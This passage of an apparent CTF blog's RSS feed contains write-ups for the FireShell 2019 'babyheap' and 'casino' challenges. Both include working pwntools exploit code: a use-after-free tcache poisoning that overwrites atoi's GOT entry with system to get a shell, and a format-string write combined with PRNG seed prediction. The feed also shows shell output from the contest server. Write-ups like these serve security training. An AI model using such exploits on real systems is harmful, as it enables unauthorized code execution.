[*] Closed connection to 35.243.188.20 port 2005
&lt;/code&gt;&lt;/pre&gt;</description>
       </item>
       
       <item>
         <title>FireShell 2019 - babyheap</title>
         <link>http://kiror0.github.io/ctf/posts/fireshell-2019-babyheap/</link>
         <pubDate>Mon, 28 Jan 2019 06:54:34 +0000</pubDate>
         
         <guid>http://kiror0.github.io/ctf/posts/fireshell-2019-babyheap/</guid>
         <description>&lt;h2 id=&#34;downloads&#34;&gt;downloads&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://kiror0.github.io/ctf/assets/fireshell/babyheap/babyheap.zip&#34;&gt;binary&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://kiror0.github.io/ctf/assets/fireshell/babyheap/libc.so.6&#34;&gt;libc.so.6&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://kiror0.github.io/ctf/assets/fireshell/babyheap/solve.py&#34;&gt;solve.py&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;summary&#34;&gt;summary&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;create&lt;/code&gt;, &lt;code&gt;edit&lt;/code&gt;, &lt;code&gt;show&lt;/code&gt;, &lt;code&gt;delete&lt;/code&gt;, and &lt;code&gt;fill&lt;/code&gt;, each functions can only be used once.&lt;/li&gt;
&lt;li&gt;UAF in &lt;code&gt;delete&lt;/code&gt;, after chunk gets freed but didn&#39;t &lt;code&gt;NULL&lt;/code&gt; the buf pointer.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;delete&lt;/code&gt; will reset the &lt;code&gt;create&lt;/code&gt; &amp;lsquo;consumption&amp;rsquo;, but you can&#39;t &lt;code&gt;delete&lt;/code&gt; again after that.&lt;/li&gt;
&lt;li&gt;Use tcache-poisoning to control heap return arbritrary address&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;exploit&#34;&gt;exploit&lt;/h2&gt;
&lt;p&gt;A brief helper function,&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fill&lt;/span&gt;(buf):
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;1337&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Fill &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, buf)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;create&lt;/span&gt;():
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;edit&lt;/span&gt;(buf):
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Content? &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, buf)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;show&lt;/span&gt;():
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Content: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;----&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, drop&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;True)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;delete&lt;/span&gt;():
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;trigger free to put tcache,&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;create() &lt;span style=&#34;color:#75715e&#34;&gt;# init tcache, heap, ...&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# pwndbg&amp;gt; x/6gx 0x6020a0&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x6020a0:       0x0000000000000001      0x0000000000000000&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#                   ^-- create used&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x6020b0:       0x0000000000000000      0x0000000000000000&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x6020c0:       0x0000000000000000      0x0000000002050250&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#                                           ^-- buf&lt;/span&gt;

delete() &lt;span style=&#34;color:#75715e&#34;&gt;# trigger UAF&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# pwndbg&amp;gt; x/6gx 0x6020a0&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x6020a0:       0x0000000000000000      0x0000000000000000&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#                   ^-- create reset&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x6020b0:       0x0000000000000000      0x0000000000000001&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#                                           ^-- delete used&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x6020c0:       0x0000000000000000      0x0000000002050250&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# pwndbg&amp;gt; tcachebins&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# tcachebins&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x70 [  1]: 0x2050250 ◂— 0x0&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;use UAF to &lt;em&gt;poison&lt;/em&gt; tcache free list, put .bss + 0x20 to control function &lt;em&gt;&amp;lsquo;consumption&amp;rsquo;&lt;/em&gt;
and buf pointer.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;edit(p64(elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;bss(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;))) &lt;span style=&#34;color:#75715e&#34;&gt;# 0x6020a0, function &amp;#39;consumption&amp;#39; and buf pointer&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# pwndbg&amp;gt; dq 0x2050250&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0000000002050250     0000000000000000 0000000000000071&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0000000002050260     00000000006020a0 0000000000000000&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0000000002050270     0000000000000000 0000000000000000&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0000000002050280     0000000000000000 0000000000000000&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# pwndbg&amp;gt; tcachebins &lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# tcachebins&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x70 [  1]: 0x2050260 —▸ 0x6020a0 ◂— 0x0&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Second next &lt;code&gt;malloc(0x68)&lt;/code&gt; request will create a chunk at &lt;code&gt;0x6020a0&lt;/code&gt;,
and we could fill it with bunch of &lt;code&gt;NULL&lt;/code&gt;s to control funtion &lt;em&gt;&amp;lsquo;consumption&amp;rsquo;&lt;/em&gt;,
plus overwrite buf pointer to gain arbitrary read/write, in here I&#39;ll use GOT &lt;code&gt;atoi&lt;/code&gt;
as it&#39;ll be easier to leak libc and overwrite it with &lt;code&gt;system&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;create() &lt;span style=&#34;color:#75715e&#34;&gt;# first request&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# pwndbg&amp;gt; tcachebins &lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# tcachebins&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x70 [  0]: 0x6020a0 ◂— 0x1&lt;/span&gt;

payload  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# fill bunch of NULLs&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# fill bunch of NULLs&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# fill bunch of NULLs&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# fill bunch of NULLs&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# fill bunch of NULLs&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;got[&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;atoi&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;]) &lt;span style=&#34;color:#75715e&#34;&gt;# buf, get r/w, 0x602060&lt;/span&gt;
fill(payload) &lt;span style=&#34;color:#75715e&#34;&gt;# second request&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# pwndbg&amp;gt; tcachebins &lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# tcachebins&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x70 [ -1]: 0x1&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# pwndbg&amp;gt; dq 0x6020a0&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 00000000006020a0     0000000000000000 0000000000000000&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 00000000006020b0     0000000000000000 0000000000000000&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 00000000006020c0     0000000000000001 0000000000602060&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#                       ^-- fill used    ^-- buf controlled&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;leak libc with &lt;code&gt;show&lt;/code&gt; and overwrite &lt;code&gt;atoi&lt;/code&gt; with &lt;code&gt;system&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; u64(show()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ljust(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;symbols[&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;atoi&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;]

edit(p64(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;symbols[&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;system&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;]))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Trigger &lt;code&gt;atoi(&#39;/bin/sh&#39;)&lt;/code&gt; which is now &lt;code&gt;system(&#39;/bin/sh&#39;)&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/bin/sh&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Profit.&lt;/p&gt;
&lt;h2 id=&#34;flag&#34;&gt;flag&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;[+] Opening connection to 35.243.188.20 on port 2000: Done
[*] Switching to interactive mode
$ ls
babyheap
babyheap.sh
flag.txt
$ cat flag.txt
F#{W3lc0m3_t0_h34p_Expl01t4t10n!}$
[*] Interrupted
[*] Closed connection to 35.243.188.20 port 2000
&lt;/code&gt;&lt;/pre&gt;</description>
       </item>
       
       <item>
         <title>FireShell 2019 - casino</title>
         <link>http://kiror0.github.io/ctf/posts/fireshell-2019-casino/</link>
         <pubDate>Mon, 28 Jan 2019 06:54:28 +0000</pubDate>
         
         <guid>http://kiror0.github.io/ctf/posts/fireshell-2019-casino/</guid>
         <description>&lt;h2 id=&#34;download&#34;&gt;download&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://kiror0.github.io/ctf/assets/fireshell/casino/casino.zip&#34;&gt;binary&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://kiror0.github.io/ctf/assets/fireshell/casino/solve.py&#34;&gt;solve.py&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;summary&#34;&gt;summary&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;PRNG seed with &lt;code&gt;time(0) / 10 + bet&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Guess the number game, but intended to never win the game because the loop will only reach 99 not 100&lt;/li&gt;
&lt;li&gt;format string in &lt;code&gt;main&lt;/code&gt; used to overwrite &lt;code&gt;bet&lt;/code&gt; with value &amp;gt; 1, so that you can win the game&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;exploit&#34;&gt;exploit&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sys&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; ctypes

context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;terminal &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;tmux&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;split-window&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;-h&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;]
elf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;./casino&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, checksec&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;False)

libc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ctypes&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;CDLL(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/usr/lib64/libc.so.6&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
seed &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;time(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__len__() &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;:
    r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], int(sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]))
&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
    r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;process(aslr&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;False)
    gdb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;attach(r, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;brva 0xac3&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)

payload  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;___&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;11$n{}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x602020&lt;/span&gt;)) &lt;span style=&#34;color:#75715e&#34;&gt;# overwrite bet with 3&lt;/span&gt;
r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;? &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, payload)

libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;srand(seed &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;99&lt;/span&gt;):
    ans &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; str(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;rand())
    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt; r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv()
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(ans)

r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()

&lt;span style=&#34;color:#75715e&#34;&gt;# F#{buggy_c4s1n0_1s_n0t_f41r!}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;footnote&#34;&gt;footnote&lt;/h2&gt;
&lt;p&gt;should be fairly easy, but connection problem in early CTF will get you timeout before reach loop end. Tried this a couple of times before getting a good one.&lt;/p&gt;
</description>
       </item>
       
       <item>
         <title>FireShell 2019 - leakless</title>
         <link>http://kiror0.github.io/ctf/posts/fireshell-2019-leakless/</link>
         <pubDate>Mon, 28 Jan 2019 06:54:21 +0000</pubDate>
         
